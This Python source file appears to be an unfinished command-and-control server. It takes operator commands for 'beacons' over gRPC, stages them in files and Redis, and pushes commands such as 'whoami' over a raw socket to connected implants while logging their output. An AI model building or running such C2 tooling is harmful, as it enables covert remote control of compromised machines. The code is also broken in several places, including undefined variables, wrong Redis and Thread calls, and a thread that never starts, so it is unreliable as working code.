import datetime
import socket
import re
import grpc
from concurrent import futures
import protobuff_pb2_grpc as pb2_grpc
import protobuff_pb2 as pb2
import redis  # Make sure to install and start the redis server
# sudo systemctl start redis-server.service
import string
from threading import Thread

conn = redis.StrictRedis(host='localhost', port=6379, db=0) # This db is used to store commands to send
result = redis.StrictRedis(host='localhost', port=6379, db=1) # This db is used to store results

class UnaryService(pb2_grpc.UnaryServicer):
    def __init__(self, *args, **kwargs):
        pass

    def GetServerResponse(self, request, context):

        # We need an ID (ID for beacon) and message (What to tell the beacon)
        message = request.message
        ID = request.bID
        opt = request.opt
        if set(ID).difference(string.ascii_letters + string.digits):
            # We're not going to bother with input sanitization here
            # If we receive special characters just drop it entirely
            pass
        else:
            if opt == 'SC':
                # If option is to set command, then write it to the file
                with open(f"{ID}.html", "w") as f:  # We're keeping the html files in another folder, e z clean up
                    f.write(message)
                result = f'Received command, wrote {message} to file {ID}'
                result = {'message': result, 'received': True}
                return pb2.MessageResponse(**result)
            elif opt == 'GR':
                # If option is to get the returned results of a beacon, page the Redis DB for the results
                res = conn.hget('beacons', f'{ID}')
                res = str(res)
                result = f'Getting status of beacon {ID}: {res}'
                result = {'message': result, 'received': True}
                return pb2.MessageResponse(**result)
            elif opt == 'GA':
                res = conn.hgetall('beacons')
                res = str(res)
                result = f'Getting all beacon data: {res}'
                result = {'message': result, 'received': True}
                return pb2.MessageResponse(**result)
            else:
                pass


def on_new_client(clientsocket):
    # Write the msg to the redis db
    conn.set(f'{ID}', 'whoami')
    # page the db for a new command
    cmd = conn.hget(f'{ID}')
    clientsocket.send(cmd)
    while True:
        msg = clientsocket.recv(1024)
        # do some checks and if msg == someWeirdSignal: break:
        result.set(f'{ID}', f'{msg}') # We update the results db with the output
        cmd = conn.hget(f'{ID}') # We then fetch a new command if one is set
        clientsocket.send(cmd) # Then send the new command to be run and await the results


def server_program():
    # get the hostname
    host = socket.gethostname()
    port = 5000  # initiate port no above 1024

    server_socket = socket.socket()  # get instance
    # look closely. The bind() function takes tuple as argument
    server_socket.bind((host, port))  # bind host address and port together

    server_socket.listen()
    c, addr = server_socket.accept()  # accept new connection
    print("Connection from: " + str(address))
    Thread(target=on_new_client, args=c)


if __name__ == '__main__':
    server_program()
